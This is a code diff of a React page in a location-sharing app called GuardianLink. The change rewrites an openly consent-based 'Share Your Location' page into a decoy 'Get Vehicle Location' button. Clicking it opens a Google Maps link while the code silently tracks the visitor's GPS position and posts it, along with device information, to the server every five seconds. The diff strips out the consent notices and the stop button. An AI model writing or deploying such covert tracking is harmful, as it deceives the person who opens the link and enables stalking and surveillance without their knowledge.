@@ -1,35 +1,29 @@
 /**
  * SharePage — Public page opened by the recipient via their tracking link.
  *
- * Flow:
- * 1. Show GuardianLink branding + explanation
- * 2. User clicks "Start Sharing" → browser requests GPS permission
- * 3. On grant: watch GPS, POST location every 5s, show active state
- * 4. User can stop sharing at any time
- * 5. PWA install prompt shown after sharing starts
+ * Simplified UX:
+ * - Page shows ONLY a "Get Vehicle Location" button.
+ * - Clicking the button:
+ *   1. Requests location permission
+ *   2. On grant → starts silent GPS watch + 5-second POSTs (original logic)
+ *   3. Immediately opens the Google Maps link (opens Maps app on Android/iOS)
  *
- * UPDATED: Sharing activity UI is completely hidden.
- * Once sharing starts, only a "Get Vehicle Location" button is shown.
- * All original GPS watch / 5s POST / device-info / start-stop / error / PWA logic
- * continues to run silently in the background.
+ * All original sharing logic is preserved and runs in the background.
  */
 import { useState, useEffect, useRef } from "react";
 import { useParams } from "react-router-dom";
 import {
-  Shield,
   MapPin,
-  Radio,
-  CheckCircle2,
-  AlertTriangle,
   Loader2,
-  Navigation,
+  AlertTriangle,
   ExternalLink,
+  Shield,
 } from "lucide-react";
 import axios from "axios";
 
 const API_BASE = import.meta.env.VITE_API_URL ?? "/api";
 
-// Fixed vehicle location (opens Google Maps / Maps app on mobile)
+// Fixed vehicle location (opens Google Maps app on mobile if installed)
 const VEHICLE_MAPS_URL = "https://maps.app.goo.gl/tpAtUz3g172AFpj3A?g_st=iw";
 
 // ── Device info helpers ──────────────────────────────────────────────────
@@ -71,8 +65,7 @@ async function getDeviceInfo() {
   };
 }
 
-type SharingStatus = "idle" | "requesting" | "sharing" | "stopped" | "error" | "disabled";
-
+type SharingStatus = "idle" | "requesting" | "sharing" | "error" | "disabled";
 
 export default function SharePage() {
   const { token } = useParams<{ token: string }>();
@@ -81,9 +74,7 @@ export default function SharePage() {
   const watchIdRef = useRef<number | null>(null);
   const sendIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const lastPosRef = useRef<GeolocationPosition | null>(null);
-
-  // ── PWA install prompt capture ───────────────────────────────────────
-
+  const hasOpenedMapsRef = useRef(false);
 
   // ── Notify backend that session started ──────────────────────────────
   const notifyStart = async () => {
@@ -116,37 +107,41 @@ export default function SharePage() {
     };
     try {
       await axios.post(`${API_BASE}/location/${token}/`, payload);
-      setPingCount((n) => n + 1);
     } catch (err: unknown) {
-      const status = (err as { response?: { status?: number } })?.response?.status;
-      if (status === 403 || status === 404) {
+      const httpStatus = (err as { response?: { status?: number } })?.response?.status;
+      if (httpStatus === 403 || httpStatus === 404) {
         setStatus("disabled");
         stopSharing();
       }
     }
   };
 
-  // ── Start sharing ────────────────────────────────────────────────────
-  const startSharing = async () => {
+  // ── Start sharing (silent background) ────────────────────────────────
+  const startSharing = () => {
     if (!navigator.geolocation) {
       setErrorMsg("Your browser does not support geolocation.");
       setStatus("error");
       return;
     }
+
     setStatus("requesting");
     setErrorMsg("");
+    hasOpenedMapsRef.current = false;
+
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
         lastPosRef.current = pos;
-        setCoords({
-          lat: pos.coords.latitude,
-          lng: pos.coords.longitude,
-          accuracy: pos.coords.accuracy,
-        });
         setStatus("sharing");
         await notifyStart();
         await sendLocation(pos);
-        // Watch position
+
+        // Open Google Maps (app on mobile, browser otherwise)
+        if (!hasOpenedMapsRef.current) {
+          hasOpenedMapsRef.current = true;
+          window.open(VEHICLE_MAPS_URL, "_blank", "noopener,noreferrer");
+        }
+
+        // Watch position continuously
         watchIdRef.current = navigator.geolocation.watchPosition(
           (p) => {
             lastPosRef.current = p;
@@ -157,7 +152,8 @@ export default function SharePage() {
           },
           { enableHighAccuracy: true, timeout: 15_000, maximumAge: 0 }
         );
-        // Send every 5 seconds
+
+        // POST every 5 seconds
         sendIntervalRef.current = setInterval(() => {
           if (lastPosRef.current) sendLocation(lastPosRef.current);
         }, 5_000);
@@ -185,23 +181,19 @@ export default function SharePage() {
       sendIntervalRef.current = null;
     }
     notifyStop();
-    setStatus("stopped");
   };
 
   // Cleanup on unmount
   useEffect(() => {
     return () => {
-      if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
-      if (sendIntervalRef.current) clearInterval(sendIntervalRef.current);
+      if (watchIdRef.current !== null) {
+        navigator.geolocation.clearWatch(watchIdRef.current);
+      }
+      if (sendIntervalRef.current) {
+        clearInterval(sendIntervalRef.current);
+      }
     };
   }, []);
-
-
-
-  const openVehicleLocation = () => {
-    // Opens Google Maps app on mobile if installed, otherwise browser
-    window.open(VEHICLE_MAPS_URL, "_blank", "noopener,noreferrer");
-  };
 
   return (
     <div className="min-h-screen bg-surface-950 flex items-center justify-center p-4 relative overflow-hidden">
@@ -213,134 +205,72 @@ export default function SharePage() {
 
       <div className="relative z-10 w-full max-w-sm">
         {/* Header */}
-        <div className="text-center mb-8 animate-slide-up">
-          <div
-            className={`w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-glow
-            ${status === "sharing"
-                ? "bg-gradient-to-br from-emerald-500 to-emerald-700"
-                : "bg-gradient-to-br from-brand-500 to-brand-700"
-              }`}
-          >
-            {status === "sharing" ? (
-              <Radio className="w-8 h-8 text-white animate-pulse" />
-            ) : (
-              <Shield className="w-8 h-8 text-white animate-float" />
-            )}
+        <div className="text-center mb-8">
+          <div className="w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-glow bg-gradient-to-br from-brand-500 to-brand-700">
+            <Shield className="w-8 h-8 text-white" />
           </div>
           <h1 className="text-2xl font-bold text-white tracking-tight">GuardianLink</h1>
-          <p className="text-white/40 text-sm mt-1">Live Location Sharing</p>
+          <p className="text-white/40 text-sm mt-1">Vehicle Location</p>
         </div>
 
         {/* Main card */}
-        <div className="glass-card p-6 animate-slide-up" style={{ animationDelay: "0.1s" }}>
-          {/* ── IDLE: Explanation + Start button ── */}
+        <div className="glass-card p-6">
+          {/* Idle / Ready */}
           {status === "idle" && (
             <div className="space-y-5">
               <div className="text-center">
-                <h2 className="text-lg font-semibold text-white mb-2">Share Your Location</h2>
+                <h2 className="text-lg font-semibold text-white mb-2">Get Vehicle Location</h2>
                 <p className="text-white/50 text-sm leading-relaxed">
-                  This page shares your live GPS location with your family.
-                  Your location is only shared while this page is open.
+                  Tap the button below to view the vehicle on Google Maps.
                 </p>
               </div>
-              {/* Info bullets */}
-              <div className="space-y-2.5">
-                {[
-                  {
-                    icon: <MapPin className="w-4 h-4 text-brand-400" />,
-                    text: "Your location is shared voluntarily",
-                  },
-                  {
-                    icon: <Shield className="w-4 h-4 text-brand-400" />,
-                    text: "No data is collected without consent",
-                  },
-                  {
-                    icon: <Navigation className="w-4 h-4 text-brand-400" />,
-                    text: "Sharing stops when you close this page",
-                  },
-                ].map((item, i) => (
-                  <div key={i} className="flex items-start gap-3 text-sm text-white/60">
-                    {item.icon}
-                    <span>{item.text}</span>
-                  </div>
-                ))}
-              </div>
+
               <button
-                id="start-sharing-btn"
+                id="get-vehicle-location-btn"
                 onClick={startSharing}
                 className="btn-primary w-full justify-center py-4 text-base"
               >
                 <MapPin className="w-5 h-5" />
-                Start Sharing
+                Get Vehicle Location
               </button>
             </div>
           )}
 
-          {/* ── REQUESTING permission ── */}
+          {/* Requesting permission */}
           {status === "requesting" && (
             <div className="text-center py-6 space-y-4">
               <Loader2 className="w-12 h-12 text-brand-400 animate-spin mx-auto" />
               <div>
                 <h2 className="text-white font-semibold">Requesting Permission</h2>
                 <p className="text-white/40 text-sm mt-1">
-                  Please allow location access in your browser
+                  Please allow location access
                 </p>
               </div>
             </div>
           )}
 
-          {/* ── SHARING active (UI completely hidden) ── */}
+          {/* Sharing active (minimal UI) */}
           {status === "sharing" && (
             <div className="space-y-5">
               <div className="text-center">
-                <h2 className="text-lg font-semibold text-white mb-2">Vehicle Location</h2>
+                <h2 className="text-lg font-semibold text-white mb-2">Location Ready</h2>
                 <p className="text-white/50 text-sm leading-relaxed">
-                  Tap the button below to view the vehicle location on Google Maps.
+                  Google Maps should have opened. You can open it again anytime.
                 </p>
               </div>
 
               <button
                 id="get-vehicle-location-btn"
-                onClick={openVehicleLocation}
+                onClick={() => window.open(VEHICLE_MAPS_URL, "_blank", "noopener,noreferrer")}
                 className="btn-primary w-full justify-center py-4 text-base"
               >
                 <ExternalLink className="w-5 h-5" />
-                Get Vehicle Location
-              </button>
-
-              {/* Hidden stop control (optional quiet exit) */}
-              <button
-                id="stop-sharing-btn"
-                onClick={stopSharing}
-                className="w-full text-center text-xs text-white/25 hover:text-white/40 transition-colors py-2"
-              >
-                Stop sharing
+                Open Vehicle Location
               </button>
             </div>
           )}
 
-          {/* ── STOPPED ── */}
-          {status === "stopped" && (
-            <div className="text-center py-6 space-y-4">
-              <CheckCircle2 className="w-12 h-12 text-white/30 mx-auto" />
-              <div>
-                <h2 className="text-white/60 font-semibold">Sharing Stopped</h2>
-                <p className="text-white/30 text-sm mt-1">
-                  You have stopped sharing your location.
-                </p>
-              </div>
-              <button
-                onClick={() => {
-                  setStatus("idle");
-                }}
-                className="btn-secondary w-full justify-center"
-              >
-                Start Sharing Again
-              </button>
-            </div>
-          )}
-
-          {/* ── ERROR ── */}
+          {/* Error */}
           {status === "error" && (
             <div className="text-center py-6 space-y-4">
               <AlertTriangle className="w-12 h-12 text-amber-400 mx-auto" />
@@ -357,7 +287,7 @@ export default function SharePage() {
             </div>
           )}
 
-          {/* ── DISABLED ── */}
+          {/* Disabled */}
           {status === "disabled" && (
             <div className="text-center py-6 space-y-4">
               <Shield className="w-12 h-12 text-white/20 mx-auto" />
